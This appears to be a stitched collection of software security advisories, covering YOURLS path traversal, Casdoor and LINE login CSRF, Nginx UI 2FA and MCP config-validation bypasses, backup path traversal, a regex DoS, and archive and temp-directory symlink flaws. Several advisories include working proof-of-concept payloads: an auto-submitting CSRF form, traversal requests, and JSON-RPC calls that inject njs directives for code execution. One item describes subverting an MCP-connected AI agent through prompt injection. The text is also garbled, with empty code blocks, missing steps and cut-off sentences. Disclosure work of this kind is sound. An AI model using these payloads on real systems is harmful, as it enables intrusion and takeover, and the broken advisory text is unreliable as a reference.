Both settings are keyword arguments on `FastMCP(...)` (1.x), `MCPServer.run()` / `streamable_http_app()` (2.x) and `StreamableHTTPSessionManager`; `None` disables them.

This bounds retention rather than eliminating it: a live session still holds its `initialize` parameters (up to roughly twice the 4 MiB body limit), and an `initialize` with invalid parameters still opens a session that expires like any other. On a small host, lower `session_idle_timeout`, `max_sessions` and `max_request_body_size` to fit.

If you cannot upgrade yet, pass `stateless_http=True` (1.12.0 or later) where you need no per-session state, or restrict who can reach the endpoint.

## Summary YOURLS versions ≤1.10.4 contain an unauthenticated path traversal vulnerability that allows attackers to include and execute arbitrary PHP files on the server without any credentials. ## Details The vulnerability exists because YOURLS uses **URL sanitization functions** (`yourls_sanitize_url()`, `yourls_esc_url()`) to filter request paths, but these functions are designed to clean URLs, not filesystem paths. They preserve `/` and `.` characters, allowing `../` sequences to pass through unfiltered. The unsanitized keyword is then directly concatenated into a filesystem path and passed to `file_exists()` and later `include()` operations, enabling path traversal attacks. **Data Flow:** ``` HTTP Request URI (with ../) ↓ yourls_get_request() (no sanitization) ↓ yourls_sanitize_url() (preserves / and .) ↓ yourls_esc_url() (permits / and . via regex) ↓ Keyword extraction (preserves ../) ↓ file_exists(YOURLS_PAGEDIR . "/$keyword.php") ← Sink ↓ include(YOURLS_PAGEDIR . "/$keyword.php") ← Code Execution ``` ## Proof of Concept (POC) In the concept validation, we assume that the attacker has uploaded a `test.php` file to the web root directory, but it cannot be accessed directly. (Of course, it could also be any path, such as `/tmp/test.php`) ### Setup Place a test file in web root: `./test.php`: ```php ``` ### Attack Request ```http GET /../../test HTTP/1.1 Host: target.com Connection: close ``` ### Response (Apache Environment) ## Impact 1. Remote execution of uploaded PHP files – An attacker uploads a malicious PHP file to an arbitrary location on the server (e.g., via another vulnerability or file upload feature), obtains its absolute path but cannot access it directly. The attacker then leverages this vulnerability to include and execute the PHP file, gaining code execution privileges. 2. Indirect triggering of PHP code injection – If a PHP code injection point exists on the system (e.g., log injection, session injection) but the injected file cannot be accessed directly due to configuration restrictions, the attacker can use this vulnerability to include and execute the injected code, achieving remote command execution or further compromise.

## Summary

In the Casdoor SSO flow, the OAuth `state` parameter is hard-coded to `settings.CasdoorSettings.Application` — a value identical for every user and every login. The callback handler accepts whatever `state` the client sends without comparing it to anything stored in the user agent, enabling a login-CSRF: an attacker can force the victim's browser to authenticate as the *attacker*.

## Details

`api/user/casdoor.go:92-117` (`GetCasdoorUri`):

```go
func GetCasdoorUri(c *gin.Context) {
    clientId := settings.CasdoorSettings.ClientId
    redirectUri := settings.CasdoorSettings.RedirectUri
    state := settings.CasdoorSettings.Application      // ← constant
    ...
    c.JSON(http.StatusOK, gin.H{
        "uri": fmt.Sprintf(
            "%s/login/oauth/authorize?client_id=%s&response_type=code&redirect_uri=%s&state=%s&scope=read",
            endpoint, clientId, encodedRedirectUri, state),
    })
}
```

`api/user/casdoor.go:24-90` (`CasdoorCallback`):

```go
type CasdoorLoginUser struct {
    Code  string `json:"code" binding:"required,max=255"`
    State string `json:"state" binding:"required,max=255"`
}

func CasdoorCallback(c *gin.Context) {
    var loginUser CasdoorLoginUser
    if !cosy.BindAndValid(c, &loginUser) { return }
    ...
    // state is NEVER compared to a per-session value
    token, err := casdoorsdk.GetOAuthToken(loginUser.Code, loginUser.State)
    ...
    u, err := user.GetUser(claims.Name)        // username from Casdoor's JWT
    ...
    userToken, err := user.GenerateJWT(u)       // JWT minted for whatever user came back
}
```

Compare with the OIDC implementation in `api/user/oidc.go:35-48`, which generates a random state, stores it in an `oidc_state` cookie, and validates it on the callback. Casdoor has no such check.

## Proof of Concept

1. Attacker initiates a Casdoor authorisation flow on their own browser, obtaining an authorisation `code` for *their* Casdoor account.
2. Attacker hosts a page that auto-submits the captured `code` to the victim's nginx-ui:

   ```html
   <html><body><form action="https://victim.example/api/casdoor_callback" method="POST"
                     enctype="text/plain" id="x">
     <input name='{"code":"<attacker_code>","state":"<App>","junk":"' value='"}'>
   </form>
   <script>document.getElementById('x').submit()</script>
   </body></html>
   ```

3. Server exchanges the attacker's `code`, looks up the username from `claims.Name` in the local user table, and mints a JWT for *that* row. The callback also sets the `_nginx_ui_secure_session` cookie via `middleware.EnsureSecureSessionCookie(c)` (`casdoor.go:84`) — meaning the victim is now silently authenticated as the attacker.
4. Victim, believing they are using their own account, configures sites / TLS keys; the attacker reads them.

## Impact

Login CSRF — the victim is forced to authenticate as the attacker, leading to data exfiltration of anything the victim subsequently uploads or configures. Particularly dangerous when nginx-ui is used by an organisation where Casdoor maps internal identities — the attacker can attribute their changes to the victim.

## Patches

Mirror the OIDC implementation:

```diff
+ import (
+    "crypto/rand"
+    "crypto/subtle"
+    "encoding/hex"
+    ...
+ )

 func GetCasdoorUri(c *gin.Context) {
     ...
-    state := settings.CasdoorSettings.Application
+    b := make([]byte, 16)
+    if _, err := rand.Read(b); err != nil {
+        cosy.ErrHandler(c, err); return
+    }
+    state := hex.EncodeToString(b)
+    c.SetSameSite(http.SameSiteLaxMode)
+    c.SetCookie("casdoor_state", state, 600, "/", "",
+                cSettings.ServerSettings.EnableHTTPS, true)
     ...
 }

 func CasdoorCallback(c *gin.Context) {
+    expected, err := c.Cookie("casdoor_state")
+    if err != nil {
+        c.AbortWithStatusJSON(http.StatusBadRequest,
+            gin.H{"message":"missing state cookie"}); return
+    }
     var loginUser CasdoorLoginUser
     if !cosy.BindAndValid(c, &loginUser) { return }
+    if subtle.ConstantTimeCompare([]byte(expected), []byte(loginUser.State)) != 1 {
+        c.AbortWithStatusJSON(http.StatusBadRequest,
+            gin.H{"message":"invalid state"}); return
+    }
     ...
 }
```

## Workarounds

Disable Casdoor SSO until patched. The OIDC integration in `api/user/oidc.go` is correctly implemented and can be used as a substitute.

## Summary

Nginx UI has a short-lived OTP/passkey "secure session" step-up boundary for users with 2FA enabled. `RequireSecureSession()` rejects an OTP-enabled user's request unless the request includes a valid `X-Secure-Session-ID` issued after a fresh OTP/passkey verification.

The project already applies this step-up middleware to sensitive operations such as:

- Nginx config create/edit/rename/delete;
- site save/delete/enable/disable/rename/duplicate;
- stream save/delete/enable/disable/rename/duplicate;
- settings save and protected secret reads;
- backup restore.

However, several similarly sensitive authenticated mutation routes remain outside `RequireSecureSession()`. An attacker who obtains an authenticated JWT/session for a 2FA-enabled user, but does not have the victim's fresh OTP/passkey secure-session token, can still perform those operations.

The affected route groups include:

- automatic backup create/modify/delete/restore/test-S3 operations;
- DNS credential create/edit/delete operations;
- certificate and ACME user create/modify/delete/register operations;
- DNS domain, record, and DDNS create/update/delete operations;
- Nginx reload/restart, stub-status toggle, performance-setting update, and module-cache refresh operations;
- site/stream advanced-mode toggles and batch updates;
- auto-certificate binding/unbinding for sites;
- site navigation order and health-check updates.

This report is distinct from my earlier Nginx UI report about auto-backup path traversal. This report is about missing 2FA step-up authorization on sensitive authenticated mutation routes.

## Why this is a security boundary

`internal/middleware/secure_session.go` only requires a secure-session token for users with OTP enabled. For OTP users, it reads `X-Secure-Session-ID` from the header or query string and aborts with `401 Unauthorized` if the secure session is missing or invalid:

```go
if !cUser.EnabledOTP() {
    c.Next()
    return
}
ssid := c.GetHeader("X-Secure-Session-ID")
if ssid == "" {
    ssid = c.Query("X-Secure-Session-ID")
}
if ssid == "" {
    c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{
        "message": "Secure Session ID is empty",
    })
    return
}

if user.VerifySecureSessionID(ssid, cUser.ID) {
    c.Next()
    return
}
```

`internal/user/otp.go` issues the secure-session ID for only 10 minutes:

```go
func SetSecureSessionID(userId uint64) (sessionId string) {
    sessionId = uuid.NewString()
    cache.Set(secureSessionIDCacheKey(sessionId), userId, 10*time.Minute)
    return
}
```

The UI/server already rely on this boundary for sensitive actions. For example, `api/config/router.go` wraps config mutations with `RequireSecureSession()`:

```go
o := r.Group("", middleware.RequireSecureSession())
{
    o.POST("configs", AddConfig)
    o.POST("config", EditConfig)
    o.POST("config_mkdir", Mkdir)
    o.POST("config_rename", Rename)
    o.POST("config_delete", DeleteConfig)
}
```

`api/sites/router.go` protects normal site mutations:

```go

{
    o.POST("sites/:name/rename", RenameSite)
    o.POST("sites/:name/enable", EnableSite)
    o.POST("sites/:name/disable", DisableSite)
    o.POST("sites/:name", SaveSite)
    o.DELETE("sites/:name", DeleteSite)
    o.POST("sites/:name/duplicate", DuplicateSite)
    o.POST("sites/:name/maintenance", EnableMaintenanceSite)
}
```

`api/streams/router.go` protects normal stream mutations, and `api/settings/router.go` protects secret reads/settings saves:

```go
o := r.Group("", middleware.RequireSecureSession())
{
    o.POST("streams/:name", SaveStream)
    o.POST("streams/:name/rename", RenameStream)
    o.POST("streams/:name/enable", EnableStream)
    o.POST("streams/:name/disable", DisableStream)
    o.DELETE("streams/:name", DeleteStream)
    o.POST("streams/:name/duplicate", Duplicate)
}
```

```go
r.GET("settings/protected", middleware.RequireSecureSession(), GetProtectedSetting)
r.POST("settings", middleware.RequireSecureSession(), SaveSettings)
```

The repository's own tests also verify this expected behavior. `api/config/security_test.go`, `api/sites/security_test.go`, and `api/streams/security_test.go` each assert that OTP-enabled users receive `401 Unauthorized` when protected mutations are attempted without a secure session.

## Affected routes outside the step-up boundary

The affected routes are under the authenticated private router:

```go

```

but they do not add `middleware.RequireSecureSession()`.

### Automatic backup management

`api/backup/router.go` protects manual restore:

```go
r.POST("/restore", middleware.AuthRequired(), middleware.RequireSecureSession(), middleware.EncryptedForm(), RestoreBackup)
```

but the automatic backup management router has no secure-session middleware:

```go

r.POST("/auto_backup/:id", ModifyAutoBackup)
r.DELETE("/auto_backup/:id", DestroyAutoBackup)
r.PATCH("/auto_backup/:id", RestoreAutoBackup)
```

```go

r.POST("dns_credentials/:id", EditDnsCredential)
```

### DNS domains, records, and DDNS

`api/dns/router.go` registers DNS domain, record, and DDNS mutations without secure-session middleware:

```go

group.POST("/domains/:id", UpdateDomain)
```

This is a local-only reproduction outline for an isolated Nginx UI test instance, consistent with the project's security policy:

2. Log in as that user and keep only the normal authenticated session/JWT.

The same missing step-up applies to the other route groups listed above.

## Impact

If an attacker obtains the authenticated web session/JWT for a 2FA-enabled Nginx UI user, the secure-session boundary should limit what they can do until they also pass a fresh OTP/passkey challenge. The current route map leaves major administrative actions outside that boundary.

Depending on the victim user's privileges and deployment configuration, this can allow the attacker to:

- add, edit, or remove DNS provider credentials;
- alter certificate and ACME automation;
- create, modify, delete, or restore automatic backup jobs;
- configure S3 backup destinations and trigger S3 connection tests;
- alter DNS domains, records, or DDNS schedules through configured providers;
- restart or reload Nginx;
- enable/disable stub-status and change performance settings;
- switch sites/streams into advanced mode or change site automation bindings.

This undermines the value of the secure-session step-up for OTP-enabled accounts. I am not claiming pre-authentication access or remote code execution from this issue. The issue is missing step-up authorization for sensitive authenticated mutations.

## Suggested fix

Recommended mitigation:

1. Apply `middleware.RequireSecureSession()` to all high-impact authenticated mutation routes that alter server, Nginx, certificate, DNS, backup, credential, or automation state.
2. At minimum, protect:

   - DNS credential create/edit/delete;
   - certificate and ACME user mutations;
   - DNS domain, record, and DDNS mutations;
   - Nginx reload/restart/stub-status/performance/module-cache mutation routes;

3. Add regression tests mirroring the existing config/site/stream security tests:
   - OTP-enabled user without `X-Secure-Session-ID` receives `401`;
   - OTP-enabled user with a valid secure-session ID succeeds;

## Summary
`internal/config/validation.go` (`ValidateConfigFile`) is a security control that blocks dangerous
nginx directives — `js_*`, `perl_*`, `load_module` of the njs/perl modules, and `user root`. It is
enforced on three of the four config-write paths: `api/config/add.go`, `api/config/modify.go`, and
`mcp/config/config_modify.go`. The fourth path — the MCP tool `nginx_config_add`
(`mcp/config/config_add.go`) — does NOT call it: it writes the caller-supplied `content` straight to
disk and reloads nginx. An authenticated MCP caller (or an MCP agent induced via prompt injection)
can therefore inject exactly the directives the control is meant to block, leading to nginx code
execution on deployments where the njs/perl module is available (e.g. the official Docker image).

## Root cause — an incomplete hardening patch
Commit `3e411d38` ("Harden config write paths", 2026-04-21) introduced `ValidateConfigFile` and
wired it into the config-write paths — but its changeset touched only:

  mcp/config/config_modify.go (+5)
It did NOT touch `mcp/config/config_add.go`. So the MCP add path was left without the validation
that all of its sibling paths received. `config_add.go` has never called `ValidateConfigFile`
(verified via git history); this is an oversight in the hardening, not a regression.

```python
    post({"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}})
    print([t["name"] for t in wait(2)["result"]["tools"]])
elif cmd == "call":
    post({"jsonrpc":"2.0","id":3,"method":"tools/call",
          "params":{"name":sys.argv[2],"arguments":json.loads(sys.argv[3])}})
    print(json.dumps(wait(3, 25), indent=1))
```

## Impact
An authenticated MCP principal — or a connected AI agent subverted via prompt injection — bypasses
the directive-validation security control and injects directives the project explicitly blocks
elsewhere. On deployments with the njs/perl module available (the official Docker image ships
`ngx_http_js_module.so`), this yields code execution in the nginx worker and, via `user root`,
arbitrary file read/write as root (trivially escalated to full host compromise:
`/root/.ssh/authorized_keys`, `/etc/cron.d/*`, overwriting a binary). On stock nginx without those
modules it is a reliable DoS (failed reload) plus a `user root` privilege regression.

## Honest scope / caveats
- Authenticated (node secret or user JWT), agent-mediated — not unauthenticated.
- RCE is conditional on the njs/perl module being present; it ships in the official image, so the
  default Docker deployment is exploitable. Stock nginx without those modules → DoS instead.
- The write path is sandboxed to the nginx conf dir (no path traversal); the bug is directive
  injection. (The main nginx.conf is inside that dir and can be overwritten with overwrite=true.)
- nginx-ui runs as root by design (it manages nginx); the bypass additionally lets request-handling
  workers run as root via `user root`.

## Suggested fix
Call `config.ValidateConfigFile(path, content)` in `handleNginxConfigAdd` before `os.WriteFile`,
matching `mcp/config/config_modify.go` and the API paths — i.e. complete the `3e411d38` hardening on
the one path it missed.

## Dedup / novelty
Distinct from CVE-2026-33032 (GHSA-h6c2-x2m2-mwhf, "Unauthenticated MCP Endpoint"), whose root cause
is a MISSING AUTH middleware on /mcp_message (now fixed by adding AuthRequired) and which does not
involve config-content validation. This report is an AUTHENTICATED bypass of the directive-validation
control on the config_add path, and works on a fully patched (post-33032) instance. No existing

## Summary

Nginx UI validates `backup_path` and `storage_path` against the administrator-defined `backup.GrantedAccessPath` boundary, but the final auto-backup output filename is built from the user-controlled auto-backup `name` without stripping path separators or `..` components.

An authenticated user who can create or modify an auto-backup task can set a name such as `task/../../../escaped`. The configured `storage_path` still passes validation because it is inside `GrantedAccessPath`, but the generated backup path escapes that storage directory when `filepath.Join(storage_path, filename)` resolves the embedded traversal sequence.

This bypasses the documented backup path boundary and allows backup archives, and for encrypted configuration backups the adjacent `.key` file, to be written outside the intended storage directory with the Nginx UI process privileges.

## Affected Versions

- Current `dev` branch commit checked: `4948fba8744e82c3d7003f68ee164e9f49421066`
- Latest release checked: `v2.3.10`, published 2026-04-28
- The vulnerable filename construction is present in both current `dev` and `v2.3.10`.

## Security Boundary

The project documentation describes `backup.GrantedAccessPath` as the critical security boundary for backup operations. It says the setting:

- restricts backup operations to explicitly authorized directories,
- prevents unauthorized access to sensitive system directories,
- enforces administrator-defined boundaries,
- normalizes paths to prevent traversal attempts.

That boundary is enforced for the configured `storage_path`, but not for the final path after the backup name is appended.

## Root Cause

`model.AutoBackup.GetName()` only trims whitespace and replaces spaces:

```go
func (a *AutoBackup) GetName() string {
    return strings.ReplaceAll(strings.TrimSpace(a.Name), " ", "_")
}
```

The result is then embedded directly into filenames:

```go
filename := fmt.Sprintf("%s_%d.zip", autoBackup.GetName(), time.Now().Unix())
outputPath = filepath.Join(autoBackup.StoragePath, filename)
```

and for custom directory backups:

```go
filename := fmt.Sprintf("custom_dir_%s_%d.zip", autoBackup.GetName(), time.Now().Unix())
outputPath = filepath.Join(autoBackup.StoragePath, filename)
```

The API validation rules require `name`, `backup_type`, `storage_type`, `storage_path`, and `cron_expression`, but do not reject `/`, `\`, or `..` in `name`. `ValidateAutoBackupConfig` validates `backup_path` and `storage_path`, but it does not validate the final `outputPath` after appending the generated filename.

Relevant paths:

- `model/auto_backup.go`
- `api/backup/auto_backup.go`
- `internal/backup/auto_backup.go`
- `internal/backup/utils.go`

## Proof of Concept

The following local-only reproducer mirrors the relevant code path without contacting any external system:

```go
name := "task/../../../escaped"
filename := fmt.Sprintf("custom_dir_%s_%d.zip", getName(name), int64(1715555555))
outputPath := filepath.Join(storageDir, filename)
```

Setup:

1. Create a temporary `granted` directory.
2. Set `sourceDir` and `storageDir` under that granted directory.
3. Treat only `granted` as the allowed path boundary.
4. Use the auto-backup name `task/../../../escaped`.
5. Create the custom-directory backup using the same filename pattern and zip creation behavior.

Observed output:

```text
granted_root=/Users/jagadeshachanta/.cache/tmp/nginx-ui-autobackup-poc-1538710430/granted
validated_storage_path=/Users/jagadeshachanta/.cache/tmp/nginx-ui-autobackup-poc-1538710430/granted/storage
auto_backup_name="task/../../../escaped"
constructed_filename="custom_dir_task/../../../escaped_1715555555.zip"
created_file=/Users/jagadeshachanta/.cache/tmp/nginx-ui-autobackup-poc-1538710430/escaped_1715555555.zip
escaped_validated_storage_path=true
created_file_exists=true
```

The configured storage path is inside the granted directory, but the created backup file is outside both the storage directory and the granted directory.

A repo-local regression test was also prepared at:

```text
internal/backup/auto_backup_path_traversal_poc_test.go
```

The test cannot currently be executed cleanly in this checkout because unrelated build prerequisites fail before the package test runs:

```text
app/app.go: pattern all:dist: no matching files found
model/cert.go: no required module provides package github.com/go-acme/lego/v5/certificate
internal/helper/key_type.go: no required module provides package github.com/go-acme/lego/v5/certcrypto
```

The standalone reproducer output above was therefore used as the executable proof for this report.

## Impact

An authenticated user with access to the auto-backup API can bypass the administrator-configured backup storage boundary. Depending on filesystem permissions and deployment layout, this can:

- write backup archives outside the intended `storage_path`,
- write encrypted configuration backup key files outside the intended `storage_path`,
- place sensitive backup material in directories that administrators did not authorize for backup storage,
- create or overwrite timestamp-suffixed files outside the validated backup directory using the Nginx UI process privileges.

This is especially relevant because backup archives may contain Nginx UI configuration, database files, Nginx configuration, and for encrypted config backups the adjacent key file required to decrypt the archive.

## Suggested Fix

Recommended defense in depth:

1. Treat auto-backup `name` as a display label only, not as a filesystem path component.
2. Sanitize generated filenames with `filepath.Base` or a strict allowlist such as `[A-Za-z0-9._-]`.
3. Reject path separators, drive separators, NUL bytes, and `..` segments in `name`.
4. After constructing `outputPath`, clean it and validate that the final path remains inside the already-validated `storage_path`.
5. Add regression tests for both local and S3 temporary-file paths.

Example invariant:

```go
cleanOutput := filepath.Clean(outputPath)
cleanStorage := filepath.Clean(autoBackup.StoragePath) + string(filepath.Separator)
if !strings.HasPrefix(cleanOutput, cleanStorage) {
    return ErrPathNotInGrantedAccess
}
```

## Disclosure Notes

This was tested only in a local isolated environment against source code and temporary directories. No online demo systems or production systems were tested.

AI assistance was used to inspect the open-source code, prepare the local reproducer, and draft this report. The issue and PoC output were verified locally before submission.

## Summary

The regular HTTP configuration API rejects restricted Nginx directives such as `load_module`, `js_import`, and `js_content`.

However, the MCP configuration interface allows a secondary authenticated user to write and apply equivalent restricted configuration content. In the lab, this allowed the user to load `ngx_http_js_module.so`, import attacker-controlled JavaScript, reload Nginx, and execute NJS in the Nginx worker context.

This is authenticated and is not OS command execution by itself.

## Affected component

- `/mcp`
- `/mcp_message`
- MCP tool: `nginx_config_add`
- Nginx configuration validation

## Impact

A secondary authenticated user can bypass the restricted directive validation enforced by the HTTP API and execute attacker-controlled NJS inside the Nginx worker context.

This may allow modification of Nginx runtime behavior, including responses, routing, headers, redirects, and request handling.

## Minimal PoC

### Preconditions

- Attacker has a secondary authenticated Nginx UI account.
- MCP is enabled.
- Nginx has NJS available:

```bash
find / -name "ngx_http_js_module.so" 2>/dev/null
```

Observed in the lab:

```text
/usr/lib/nginx/modules/ngx_http_js_module.so
```

### 1. HTTP API blocks the restricted config

Request:

```http
POST /api/configs
Authorization: <SECONDARY_USER_JWT>
Content-Type: application/json
```

Body:

```json
{
 "name": "nginx.conf",
 "base_dir": "",
 "overwrite": true,
 "sync_node_ids": [],
 "content": "load_module modules/ngx_http_js_module.so;\n\nuser nginx;\nworker_processes auto;\n\nevents { worker_connections 1024; }\n\nhttp {\n js_import poc from /etc/nginx/poc.js;\n server {\n listen 127.0.0.1:18249;\n location /__poc { js_content poc.handler; }\n }\n}\n"
}
```

Observed result:

```text
Rejected because the content contains restricted directives such as load_module/js_import/js_content.
```

### 2. MCP writes the JavaScript file

Open an MCP session and call `tools/call` with:

```json
{
 "jsonrpc": "2.0",
 "id": 1,
 "method": "tools/call",
 "params": {
 "name": "nginx_config_add",
 "arguments": {
 "name": "poc.js",
 "base_dir": "",
 "overwrite": true,
 "sync_node_ids": [],
 "content": "function handler(r) { r.return(200, \"MCP_NJS_MARKER\\n\"); }\nexport default { handler };\n"
 }
 }
}
```

### 3. MCP writes the NJS-enabled nginx.conf

Call `tools/call` again:

```json
{
 "jsonrpc": "2.0",
 "id": 2,
 "method": "tools/call",
 "params": {
 "name": "nginx_config_add",
 "arguments": {
 "name": "nginx.conf",
 "base_dir": "",
 "overwrite": true,
 "sync_node_ids": [],
 "content": "load_module modules/ngx_http_js_module.so;\n\nuser nginx;\nworker_processes auto;\n\nerror_log /var/log/nginx/error.log notice;\npid /run/nginx.pid;\n\nevents { worker_connections 1024; }\n\nhttp {\n default_type application/octet-stream;\n js_import poc from /etc/nginx/poc.js;\n server {\n listen 127.0.0.1:18249;\n location /__poc { js_content poc.handler; }\n }\n}\n"
 }
 }
}
```

### 4. Verify NJS execution

Inside the Nginx UI container:

```bash
curl -i http://127.0.0.1:18249/__poc
```

Observed response:

```http
HTTP/1.1 200 OK

MCP_NJS_MARKER
```

This confirms that content rejected by the HTTP API can be applied through MCP and executed as NJS in the Nginx worker context.

## Expected behavior

MCP configuration tools should enforce the same restricted directive validation as the HTTP API.

## Suggested fix

Apply `ValidateConfigFile(path, content)` before MCP configuration writes and ensure HTTP API and MCP share the same validation tests for restricted directives such as:

- `load_module`
- `js_import`
- `js_content`
- `js_set`
- `perl_set`
- `user root`

cves.summary:
### Description

A Regular Expression Denial of Service vulnerability in the built-in AdonisJS slug route matcher may allow a remote attacker to block the Node.js event loop using a specially crafted URL.

This affects applications using `router.matchers.slug()` on a route parameter reachable by an attacker.

### Details

The regular expression used by `router.matchers.slug()` contains adjacent greedy quantifiers with overlapping character classes:

```regex
/^[^\s-_](?!.*?[-_]{2,})([a-z0-9-\\]{1,})[^\s]*[^-_\s]$/
```

When the matcher receives a long string ending with a character rejected by the final assertion, the regular expression engine must evaluate many possible ways of dividing the input between the overlapping quantifiers before determining that it does not match.

This results in quadratic execution time. Testing measured an approximate complexity of `O(n^1.98)`.

Route matchers are evaluated against attacker-controlled URL segments during routing. Therefore, an unauthenticated attacker can trigger the vulnerable expression by sending a request to a route configured as follows:

```ts
router
  .get('/posts/:slug', handler)
  .where('slug', router.matchers.slug())
```

Routing occurs before route and group middleware. As a result, authentication or rate-limiting middleware attached to the affected route may not prevent exploitation.

The vulnerability is limited to routes that explicitly use the built-in slug matcher.

### Impact

Exploitation requires an application to expose a route using `router.matchers.slug()` with an attacker-controlled parameter.

A specially crafted request can cause excessive CPU consumption and block the Node.js event loop. While the expression is being evaluated, the process cannot serve other requests, including requests to unrelated routes or health-check endpoints.

Only a small number of requests may be required to consume the capacity of a worker. Reverse-proxy request-line limits reduce the maximum processing time of an individual request but do not fully mitigate the vulnerability.

### Patches

Fixes targeting v6 and v7 have been published below.

Users should upgrade to a version that includes the following fix:

- https://github.com/adonisjs/http-server/releases/tag/v9.1.1
- https://github.com/adonisjs/http-server/releases/tag/v8.2.2

### Impact

A maliciously crafted archive could contain a symlink (e.g. "evil" -> "/etc") followed by an item below it ("evil/passwd"), or an item whose path embeds ".." (e.g. "a/../../etc/passwd").

When extracting such items, borg followed the symlink / resolved the "..", so it could delete or overwrite files outside the extraction directory.

In a quite similar scenario, a crafted archive could contain a slave hardlink item with the hardlink source pointing outside the extraction directory.

When extracting such an item, borg would hard-link the outside and the inside item.
    
Note: that sounds bad, but it is no big issue in practice: to create such a malicious archive, the attacker would need repository access and (for encrypted or authenticated repos) also the borg key and passphrase.

Affected: likely all borg releases before 1.4.5 (and also all borg 2.0.0 betas before b22).

### Patches
- 1.4.x release series: fix released with 1.4.5. commits 3e9ed6d1ad6d3531b39c07b8ef3ecf41fce4437f and 141888f2fabcd57a300547c2aa63212cb213924d.
- 1.2.x release series: no new releases any more, fix commits available on 1.2-maint branch: 0ac568e290518c3bbe781459978720dde7fab224 and d907f2cb57337041c4fa55ca4682895535e5076b
- 2.0.0 betas: fix will be in 2.0.0b22, fix commits on master branch: 2d632531028b09da8ab5d1450f89bebcc205d640 and 4f37fdfed10b50559a0dd333b0d5581c642af329

### Workarounds
For encrypted or authenticated repositories, do not share borg key and passphrase with potential attackers.

For all kinds of repositories, do not share repository access with potential attackers. Usually, the repository access is protected by means outside of borg; e.g. a ssh key for remote repositories or physical access to local storage media.

### References
This issue was first discovered by AI in a private code security review initiated by @ThomasWaldmann.

A few days later, it was also independently reported to @ThomasWaldmann by:
- Michael Head (machin0r)
- Chinnapak Charoensiri [Github: Ziim-eiei].

### Impact

Applications using the LINE Login backend are vulnerable to login CSRF / forced authentication. An attacker can start a LINE authorization flow for an account they control and trick a victim into visiting the callback URL with the attacker’s authorization code. Because the LINE backend did not validate the returned OAuth state, the application could accept the forged callback and log the victim in as the attacker-controlled LINE account.

If account linking is enabled, the same flaw can allow an attacker to link their LINE identity to a victim’s existing authenticated account, creating a persistent unauthorized login path.

### Patches
* https://github.com/python-social-auth/social-core/pull/1829

### Workarounds
  Only applications that enable the LINE backend are affected.

### Credits

Thanks to Ta Duc Thien and Duc Anh Nguyen for reproting this via GitHub.

### Impact

MessagePack-CSharp is vulnerable to denial of service through excessive memory allocation when deserializing attacker-controlled data into `System.Object`.

When `PrimitiveObjectFormatter` encounters an array, it allocates an `object[]` using the declared array length **before** enforcing the configured maximum object-graph depth. A specially crafted payload containing deeply nested arrays can therefore keep many large arrays live simultaneously before deserialization is rejected for exceeding the depth limit.

Because the array-header validation uses the total unread byte count as evidence that the declared elements may be present, nested array headers can reuse the same trailing bytes for this validation. This permits a relatively small payload to cause disproportionately large managed-heap allocations. The reported example uses an approximately 31.5 KiB payload to allocate roughly 114.7 MiB of reference storage on x64—an amplification factor of approximately 3,800—before the depth exception is raised. Repeated requests may cause severe memory pressure, excessive garbage collection, process termination, or loss of service availability.

Applications are affected when they:

- Deserialize untrusted MessagePack data as `object`, or otherwise use a resolver path that selects `PrimitiveObjectFormatter`; and
- Permit an attacker to submit such data repeatedly.

ASP.NET Core SignalR is one known way to expose the vulnerability remotely: an application that enables `AddMessagePackProtocol()` and has a reachable hub method with an `object` parameter may pass attacker-controlled arguments to the vulnerable MessagePack-CSharp formatter. However, the underlying vulnerability is in MessagePack-CSharp, not SignalR, and other applications that deserialize untrusted data through the same formatter may also be affected.

MessagePack-CSharp 2.5.302 is confirmed to contain the vulnerable code. Other releases containing the same allocate-before-depth-check behavior may also be affected. Authentication requirements depend on the application exposing the deserialization endpoint: exploitation requires no privileges for a publicly reachable endpoint, while protected endpoints retain their configured authorization requirements.

### Workarounds

Where possible, avoid deserializing untrusted data into `System.Object`, including `object`-typed members of otherwise strongly typed models. Use concrete, narrowly defined DTO types instead.

For ASP.NET Core SignalR applications, any of the following can prevent or reduce exposure:

- Replace `object` parameters in reachable hub methods with concrete types.
- Disable the MessagePack hub protocol and use another protocol until a patched MessagePack-CSharp release is available.
- Restrict affected hub methods to trusted and authenticated callers.
- Apply rate limits and connection limits to reduce the ability to repeat malicious requests.

Reducing the maximum deserialization depth or transport message size may reduce the worst-case allocation, but should be treated only as defense in depth. It does not correct the allocate-before-depth-check behavior and is not a complete remediation.

Applications with advanced resolver configurations may use a custom formatter for `object` that enforces the depth limit before allocating arrays. Such a formatter should be carefully reviewed and tested against untrusted input.

### Summary

Terragrunt's `terragrunt catalog` command clones each repository referenced in your catalog configuration into a temporary working directory. In affected versions, the clone path it derived was deterministic and sat under the shared system temporary directory, in the form `<tmp>/catalog-<base64 sha1 of the repo URL>`. Because that path was predictable and Terragrunt followed a symlink already present there instead of rejecting it, a local attacker could plant a symlink at that path and cause Terragrunt to delete a directory and re-clone into it outside the intended temporary root.

### Impact

This affected users who ran `terragrunt catalog` on a host they shared with other local users or processes they did not fully trust, such as a multi-user server or a shared CI runner. The attack required a local attacker: a separate local user or process able to write to the shared system temporary directory. It was not remotely exploitable, and the victim had to run `terragrunt catalog` while the attacker's symlink was already in place.

Because the predictable path depended only on the repository URL being cataloged and the location of the system temporary directory, the attacker could compute it in advance and plant a symlink there before the victim ran the command. When the victim ran `terragrunt catalog`, Terragrunt followed the symlink out of the intended temporary root, deleted an existing `<repoName>` directory under the attacker-chosen parent, and repopulated that path with the cloned repository contents. All of this happened in the security context of the user running Terragrunt.

The attacker controlled the parent directory the symlink pointed to, but not the leaf name: the leaf was fixed to `<repoName>`, derived from the repository URL the victim cataloged. The primitive was deletion of an existing `<repoName>` directory outside the temporary root, followed by a re-clone into that same path. On a single-user machine with no hostile local processes, exposure was minimal.

### Affected Versions

- Terragrunt `< v1.1.1`

### Patches

This vulnerability has been resolved in Terragrunt version `v1.1.1`.

All users are strongly advised to upgrade.

### Workarounds

If you cannot upgrade immediately, ensure that you do not allow untrusted parties to control the values of `TMPDIR`, `TMP`, and `TEMP` in environments where you run `terragrunt catalog`.

### Technical Details

When you run `terragrunt catalog`, the catalog service iterates over the repositories in your configuration and prepares a local clone of each one. In affected versions, for a given repository URL it built a clone path by hashing the URL and joining the result under the shared system temporary directory:

```
<tmp>/catalog-<base64 sha1 of the repo URL>
```

This path was fully determined by the repository URL and the location of the system temporary directory, so anyone else on the machine who knew which repository a victim would catalog could compute it in advance. The catalog service passed this path into its clone preparation step.

